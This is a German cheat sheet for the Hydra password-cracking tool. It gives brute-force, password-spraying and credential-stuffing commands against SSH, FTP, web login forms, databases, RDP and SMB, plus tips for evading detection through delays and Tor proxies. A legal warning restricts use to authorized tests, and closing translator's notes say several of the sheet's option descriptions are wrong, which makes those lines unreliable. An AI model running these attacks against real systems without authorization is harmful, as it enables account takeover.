# 🔓 Hydra – vollständiger Spickzettel

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  _   _           _           
 | | | |_   _  __| |_ __ __ _ 
 | |_| | | | |/ _` | '__/ _` |
 |  _  | |_| | (_| | | | (_| |
 |_| |_|\__, |\__,_|_|  \__,_|
        |___/                  
    Schnelles Werkzeug für Netzwerkanmeldetests
```

<p align="center">
  <img src="https://img.shields.io/badge/Hydra-Password_Cracker-red?style=for-the-badge" alt="Hydra">
  <img src="https://img.shields.io/badge/Brute-Force-orange?style=for-the-badge" alt="Brute Force">
  <img src="https://img.shields.io/badge/50+-Protocols-blue?style=for-the-badge" alt="Protokolle">
  <img src="https://img.shields.io/badge/Network-Login-green?style=for-the-badge" alt="Netzwerk">
</p>

<p align="center">
  <b>🔑 Ein bekanntes Werkzeug für parallele Netzwerkanmeldetests</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Einführung](#-einführung)
- [Installation](#-installation)
- [Grundsyntax](#-grundsyntax)
- [Unterstützte Protokolle](#-unterstützte-protokolle)
- [SSH-Angriffe](#-ssh-angriffe)
- [FTP-Angriffe](#-ftp-angriffe)
- [Angriffe auf HTTP-Formulare](#-angriffe-auf-http-formulare)
- [Datenbankangriffe](#-datenbankangriffe)
- [Angriffe auf Remotedesktop-Dienste](#-angriffe-auf-remotedesktop-dienste)
- [Weitere Dienste](#-weitere-dienste)
- [Wortlisten und Passwörter](#-wortlisten-und-passwörter)
- [Erweiterte Optionen](#-erweiterte-optionen)
- [Praxisbeispiele](#-praxisbeispiele)
- [Kurzreferenz](#-kurzreferenz)
- [Tipps und bewährte Vorgehensweisen](#-tipps-und-bewährte-vorgehensweisen)
- [Ressourcen](#-ressourcen)

---

## 🎯 Einführung

**Hydra** (THC-Hydra) ist ein schnelles und flexibles Werkzeug für Online-Passworttests. Es unterstützt zahlreiche Protokolle und führt mehrere Anmeldeversuche parallel aus.

### Wichtige Funktionen

| Eigenschaft | Beschreibung |
|---------|-------------|
| **Über 50 Protokolle** | SSH, FTP, HTTP, RDP, SMB und weitere |
| **Parallelisiert** | Mehrere gleichzeitige Verbindungen |
| **Flexibel** | Eigene Header, Cookies und Proxy-Unterstützung |
| **Fortsetzen** | Testsitzungen speichern und wiederherstellen |
| **Plattformübergreifend** | Linux, Windows, macOS |

### Angriffsarten

| Art | Beschreibung |
|------|-------------|
| **Wörterbuchangriff** | Passwörter aus einer Wortliste ausprobieren |
| **Brute Force** | Alle Kombinationen erzeugen |
| **Password Spraying** | Ein Passwort bei mehreren Benutzern testen |
| **Credential Stuffing** | Benutzername-Passwort-Paare |

---

## 📥 Installation

### Kali Linux (vorinstalliert)
```bash
hydra -h
```

### Ubuntu/Debian
```bash
sudo apt install hydra
```

### Aus dem Quellcode
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
```

### macOS (Homebrew)
```bash
brew install hydra
```

### Installation prüfen
```bash
hydra -h
hydra -V
```

---

<a name="-grundsyntax"></a>

## ⌨️ Grundsyntax

### Allgemeine Syntax
```bash
hydra [options] target service
```

### Häufige Optionen

| Option | Beschreibung |
|--------|-------------|
| `-l` | Ein einzelner Benutzername |
| `-L` | Liste mit Benutzernamen |
| `-p` | Ein einzelnes Passwort |
| `-P` | Passwortliste |
| `-C` | Datei mit Doppelpunkt als Trennzeichen (user:pass) |
| `-t` | Threads (Standard laut Vorlage: 16) |
| `-s` | Portnummer |
| `-o` | Ausgabedatei |
| `-f` | Beim ersten gültigen Zugangsdatenpaar stoppen |
| `-V` | Ausführliche Ausgabe |
| `-vV` | Sehr ausführliche Ausgabe |
| `-d` | Diagnosemodus |

### Schnelleinstieg
```bash
# Ein Benutzer, eine Passwortliste
hydra -l admin -P passwords.txt target ssh

# Benutzerliste, ein einzelnes Passwort
hydra -L users.txt -p password123 target ssh

# Beide Listen
hydra -L users.txt -P passwords.txt target ssh
```

---

## 📡 Unterstützte Protokolle

### Vollständige Protokollliste

```
adam6500    afp         asterisk    cisco       cisco-enable
cvs         firebird    ftp         ftps        http-form-get
http-form-post          http-get    http-head   http-post
http-proxy  http-proxy-urlenum      https-form-get
https-form-post         https-get   https-head  https-post
imap        imaps       irc         ldap2       ldap2s
ldap3       ldap3-crammd5           ldap3-digestmd5
ldap3s      ldap3s-crammd5          ldap3s-digestmd5
memcached   mongodb     mssql       mysql       nntp
oracle      oracle-listener         oracle-sid  pcanywhere
pcnfs       pop3        pop3s       postgres    radmin2
rdp         redis       rexec       rlogin      rpcap
rsh         rtsp        s7-300      sapr3       sip
smb         smtp        smtp-enum   smtps       snmp
socks5      ssh         sshkey      svn         teamspeak
telnet      vmauthd     vnc         xmpp
```

---

## 🔐 SSH-Angriffe

### Einfacher SSH-Test
```bash
# Ein Benutzer
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Mehrere Benutzer
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# Bestimmter Port
hydra -l admin -P passwords.txt -s 2222 192.168.1.1 ssh
```

### SSH mit Optionen
```bash
# Versuche laut Vorlage begrenzen (Kontosperrung vermeiden)
hydra -l admin -P passwords.txt -t 4 192.168.1.1 ssh

# Beim ersten Erfolg stoppen
hydra -l admin -P passwords.txt -f 192.168.1.1 ssh

# Ausführliche Ausgabe
hydra -l admin -P passwords.txt -V 192.168.1.1 ssh
```

### SSH-Schlüsselauthentifizierung
```bash
# Privaten Schlüssel verwenden (laut Vorlage schwache Schlüssel prüfen)
hydra -l root -x 6:8:a 192.168.1.1 sshkey
```

---

## 📂 FTP-Angriffe

### Einfacher FTP-Test
```bash
# FTP-Brute-Force-Test
hydra -l admin -P passwords.txt ftp://192.168.1.1

# Anonyme FTP-Anmeldung prüfen
hydra -l anonymous -p anonymous ftp://192.168.1.1

# Mehrere Benutzer
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### FTPS (FTP über SSL)
```bash
hydra -l admin -P passwords.txt ftps://192.168.1.1
```

---

## 🌐 Angriffe auf HTTP-Formulare

### HTTP-GET-FORM

```bash
hydra -l admin -P passwords.txt target http-get-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

# Format:
# "/path:params:failure_string"
```

### HTTP-POST-FORM (häufigste Variante laut Vorlage)

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

### Syntax für Formulartests

```
"/page:POST_params:Failure_string"

Dabei gilt:
- ^USER^ = Platzhalter für den Benutzernamen
- ^PASS^ = Platzhalter für das Passwort
- Failure_string = Text bei fehlgeschlagener Anmeldung
```

### Erkennung anhand eines Erfolgsmerkmals

```bash
# S= für einen Erfolgstext statt eines Fehlertexts verwenden
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:S=Welcome"
```

### Mit Cookies

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123"
```

### HTTP-Basisauthentifizierung

```bash
# HTTP-Basisauthentifizierung
hydra -l admin -P passwords.txt http-get://192.168.1.1/admin/

# HTTPS
hydra -l admin -P passwords.txt https-get://192.168.1.1/admin/
```

### HTTP-Proxy

```bash
hydra -l admin -P passwords.txt http-proxy://proxy.server:3128
```

---

<a name="-datenbankangriffe"></a>

## 🗄️ Datenbankangriffe

### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.1

# Bestimmter Port
hydra -l root -P passwords.txt -s 3307 192.168.1.1 mysql
```

### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.1
```

### Microsoft SQL Server

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.1
```

### Oracle

```bash
# Oracle-SID-Test
hydra -l SYS -P passwords.txt oracle://192.168.1.1/SID

# Oracle-Listener
hydra -l admin -P passwords.txt oracle-listener://192.168.1.1
```

### MongoDB

```bash
hydra -l admin -P passwords.txt mongodb://192.168.1.1
```

### Redis

```bash
hydra -P passwords.txt redis://192.168.1.1
```

---

<a name="-angriffe-auf-remotedesktop-dienste"></a>

## 🖥️ Angriffe auf Remotedesktop-Dienste

### RDP (Windows-Remotedesktop)

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# Threadzahl begrenzen (RDP ist langsam)
hydra -l administrator -P passwords.txt -t 1 rdp://192.168.1.1
```

### VNC

```bash
# VNC (nur Passwort)
hydra -P passwords.txt vnc://192.168.1.1

# VNC mit abweichendem Port laut Beispiel
hydra -P passwords.txt -s 5901 192.168.1.1 vnc
```

### Telnet

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.1
```

---

## 🔧 Weitere Dienste

### SMB (Windows-Freigaben)

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.1
```

### SMTP

```bash
# SMTP-Authentifizierung
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.1

# SMTP-Enumeration
hydra -L users.txt smtp-enum://192.168.1.1
```

### POP3/IMAP

```bash
# POP3
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.1

# IMAP
hydra -l user@domain.com -P passwords.txt imap://192.168.1.1
```

### LDAP

```bash
hydra -l "cn=admin,dc=example,dc=com" -P passwords.txt ldap://192.168.1.1
```

### SNMP

```bash
hydra -P community_strings.txt snmp://192.168.1.1
```

---

## 📚 Wortlisten und Passwörter

### Häufig verwendete Wortlisten

```bash
# Speicherorte unter Kali Linux
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Passwords/

# SecLists-Passwortlisten
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

### Passwörter erzeugen (-x)

```bash
# Passwörter erzeugen: min:max:charset
hydra -l admin -x 4:6:a 192.168.1.1 ssh    # 4-6 Kleinbuchstaben
hydra -l admin -x 4:6:A 192.168.1.1 ssh    # 4-6 Großbuchstaben
hydra -l admin -x 4:6:1 192.168.1.1 ssh    # 4-6 Ziffern
hydra -l admin -x 4:6:aA1 192.168.1.1 ssh  # Gemischt

# Zeichensatzoptionen:
# a = Kleinbuchstaben    A = Großbuchstaben
# 1 = Ziffern           ! = Sonderzeichen laut Vorlage
```

### Datei mit Doppelpunkt-Trennung (-C)

```bash
# Format user:password
hydra -C creds.txt 192.168.1.1 ssh

# creds.txt:
# admin:admin
# admin:password
# root:toor
# guest:guest
```

### Benutzernamen und Passwörter anpassen

```bash
# Leere Passwörter
hydra -l admin -e n 192.168.1.1 ssh

# Benutzernamen als Passwort ausprobieren
hydra -l admin -e s 192.168.1.1 ssh

# Umgekehrten Benutzernamen als Passwort ausprobieren
hydra -l admin -e r 192.168.1.1 ssh

# Alle besonderen Prüfungen
hydra -l admin -e nsr -P passwords.txt 192.168.1.1 ssh
```

---

## ⚡ Erweiterte Optionen

### Ausgabe und Protokollierung

```bash
# Ergebnisse in eine Datei schreiben
hydra -l admin -P passwords.txt -o results.txt 192.168.1.1 ssh

# JSON-Ausgabe
hydra -l admin -P passwords.txt -o results.json -b json 192.168.1.1 ssh
```

### Tests fortsetzen

```bash
# Sitzung laut Vorlage zum Fortsetzen speichern
hydra -l admin -P large_wordlist.txt -o results.txt -R 192.168.1.1 ssh

# Unterbrochenen Test fortsetzen
hydra -R
```

### Proxy-Unterstützung

```bash
# HTTP-Proxy
export HYDRA_PROXY=http://proxy:8080
hydra -l admin -P passwords.txt 192.168.1.1 ssh

# SOCKS-Proxy
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt 192.168.1.1 ssh
```

### Leistungsoptimierung

```bash
# Threads (Standard laut Vorlage: 16)
hydra -l admin -P passwords.txt -t 32 192.168.1.1 ssh

# Wartezeit zwischen Versuchen laut Vorlage
hydra -l admin -P passwords.txt -w 10 192.168.1.1 ssh

# Verbindungszeitlimit laut Vorlage
hydra -l admin -P passwords.txt -T 30 192.168.1.1 ssh
```

### Mehrere Ziele

```bash
# Aus einer Datei
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# targets.txt:
# 192.168.1.1
# 192.168.1.2
# 192.168.1.3
```

---

## 🎬 Praxisbeispiele

### Beispiel 1: SSH-Brute-Force-Test
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
    -t 4 -V 192.168.1.1 ssh
```

### Beispiel 2: Web-Anmeldeformular
```bash
hydra -l admin -P passwords.txt \
    192.168.1.1 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid"
```

### Beispiel 3: WordPress-Anmeldung
```bash
hydra -l admin -P passwords.txt \
    target.com http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

### Beispiel 4: Mehrere Dienste
```bash
# Mehrere Dienste auf einem Host laut Vorlage prüfen
hydra -l admin -P passwords.txt 192.168.1.1 ssh ftp mysql
```

### Beispiel 5: Password Spraying
```bash
hydra -L users.txt -p "Winter2024!" \
    192.168.1.1 smb
```

### Beispiel 6: Mit Proxy/Tor
```bash
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:Failed"
```

### Beispiel 7: HTTP-Basisauthentifizierung (Administrationsoberfläche)
```bash
hydra -l admin -P passwords.txt \
    https-get://192.168.1.1/admin/
```

### Beispiel 8: RDP-Test (mit Vorsicht!)
```bash
hydra -l administrator -P passwords.txt \
    -t 1 -V rdp://192.168.1.1
```

---

## 📊 Kurzreferenz

### Wichtige Befehle

| Aufgabe | Befehl |
|------|---------|
| SSH-Test | `hydra -l user -P pass.txt ssh://target` |
| FTP-Test | `hydra -l user -P pass.txt ftp://target` |
| HTTP-POST-Formular | `hydra -l user -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:Failed"` |
| RDP-Test | `hydra -l user -P pass.txt rdp://target` |
| Ausgabe speichern | `hydra ... -o results.txt` |
| Test fortsetzen | `hydra -R` |

### Häufige Optionen

| Option | Beschreibung |
|--------|-------------|
| `-l/-L` | Benutzername oder Liste |
| `-p/-P` | Passwort oder Liste |
| `-C` | Datei im Format user:pass |
| `-t` | Threads |
| `-s` | Port |
| `-f` | Bei Erfolg stoppen |
| `-V` | Ausführliche Ausgabe |
| `-o` | Ausgabedatei |
| `-x` | Passwörter erzeugen |
| `-e nsr` | Leer, gleich oder umgekehrt ausprobieren |

---

## 💡 Tipps und bewährte Vorgehensweisen

### Hinweise zur Leistung

1. **Threadzahl bei empfindlichen Diensten begrenzen**
   ```bash
   # RDP, SMB – wenige Threads verwenden
   hydra -t 1 ...
   
   # SSH – mäßige Threadzahl
   hydra -t 4 ...
   
   # Webformulare – können höhere Werte erlauben
   hydra -t 16 ...
   ```

2. **Gezielte Wortlisten verwenden**
   ```bash
   # Laut Vorlage geeigneter als rockyou.txt:
   # - Häufigste 1000 Passwörter
   # - Standardzugangsdaten
   # - Unternehmensspezifische Einträge
   ```

3. **Zuerst Richtlinien für Kontosperrungen prüfen**
   ```bash
   # Zuerst mit einer kleinen Wortliste testen
   hydra -l admin -P small.txt -t 1 target ssh
   ```

### Hinweise zur Vermeidung einer Erkennung

```bash
# Verzögerungen hinzufügen
hydra -l admin -P passwords.txt -w 30 target ssh

# Geringe Threadzahl
hydra -l admin -P passwords.txt -t 2 target ssh

# Über einen Proxy
export HYDRA_PROXY=socks5://127.0.0.1:9050
```

---

## ⚠️ Rechtlicher Hinweis

> **WARNUNG:** Hydra ist ein leistungsfähiges Werkzeug, das ausschließlich für **autorisierte Tests** eingesetzt werden darf.
> 
> - ✅ Eigene Systeme testen
> - ✅ Mit ausdrücklicher schriftlicher Genehmigung testen
> - ✅ Bei autorisierten Penetrationstests einsetzen
> - ❌ Niemals ohne Genehmigung angreifen
> - ❌ Brute Force ohne Genehmigung ist laut Vorlage rechtswidrig
> 
> **Unbefugte Zugriffsversuche sind laut Vorlage rechtswidrig und können strafrechtliche Folgen haben.**

---

## 📚 Ressourcen

### Offizielle Ressourcen
- [THC-Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra-Handbuch](https://github.com/vanhauser-thc/thc-hydra/blob/master/README)

### Wortlisten
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [Standardzugangsdaten](https://github.com/ihebski/DefaultCreds-cheat-sheet)

### Verwandte Spickzettel
- [Nmap](../../Nmap/translations/README.de.md)
- [Metasploit](../../Metasploit/translations/README.de.md)
- [SQLMap](../../SQLMap/translations/README.de.md)

---

<p align="center">
  <b>🔓 Netzwerkanmeldetests beherrschen!</b><br>
  <i>Immer zuerst eine Genehmigung einholen</i>
</p>


---

## Hinweise zur deutschen Ausgabe

> **Optionen und Wiederaufnahme:** `-V` zeigt die Zugangsdaten jedes Versuchs; es ist kein eigenständiger Versionsaufruf. `-R` lädt eine frühere Sitzung aus der Restore-Datei und aktiviert nicht erst deren Speicherung. `-w` betrifft die Wartezeit auf Antworten, nicht pauschal eine Pause zwischen Anmeldeversuchen. `-T` begrenzt die gesamte Parallelität bei mehreren Zielen und ist kein Verbindungszeitlimit. Die Originalzeilen bleiben erhalten. [Hydra: Optionsdefinitionen](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c), [offizielles README](https://github.com/vanhauser-thc/thc-hydra/blob/master/README).

> **Schlüssel und Dienstwahl:** Das Modul `sshkey` erwartet bei `-p` einen Pfad zu einem unverschlüsselten privaten PEM-Schlüssel beziehungsweise bei `-P` eine Liste solcher Pfade. Das Beispiel mit `-x` erzeugt dagegen Kandidaten und belegt keine Prüfung schwacher Schlüssel. Die traditionelle Syntax wählt einen Dienst; die Zeile mit `ssh ftp mysql` führt nicht einfach drei unabhängige Diensttests aus. `ldap` ist keine allgemeingültige Bezeichnung für alle LDAP-Module; die Liste nennt konkrete Varianten. Verfügbare Module hängen zudem von Version und eingebundenen Bibliotheken ab. [Hydra: sshkey-Modul](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-sshkey.c), [offizielles README](https://github.com/vanhauser-thc/thc-hydra/blob/master/README).

> **Auswertung und Musterwerte:** Die Formulartexte `Invalid`, `Invalid credentials`, `Welcome` und ähnliche Werte müssen zum tatsächlichen Antwortverhalten passen; Weiterleitungen, Cookies und zusätzliche Anmeldeschritte beeinflussen das Ergebnis. Ein als erfolgreich gemeldetes Paar ist zu verifizieren. Dateipfade und Zugangsdaten sind Musterwerte. Bei `-x` steht `!` für das tatsächlich angegebene Zeichen, nicht allgemein für alle Sonderzeichen. Für HTTP-Dienste dokumentiert das Projekt `HYDRA_PROXY_HTTP`, für andere Dienste `HYDRA_PROXY`. Die Protokollliste ist eine Versionsreferenz, keine Zusage für jede Installation. [Offizielles README](https://github.com/vanhauser-thc/thc-hydra/blob/master/README).

> **Parallelität und Erkennung:** Weniger Threads verhindern keine Kontosperre; Richtlinien können Versuche pro Konto, Quelle oder Zeitraum zählen. Proxy, Tor und Verzögerungen garantieren weder Anonymität noch fehlende Erkennung. *Password Spraying* prüft ein Passwort bei mehreren Konten; *Credential Stuffing* verwendet bereits vorhandene Zugangsdatenpaare. Kein Beispiel wurde ausgeführt.
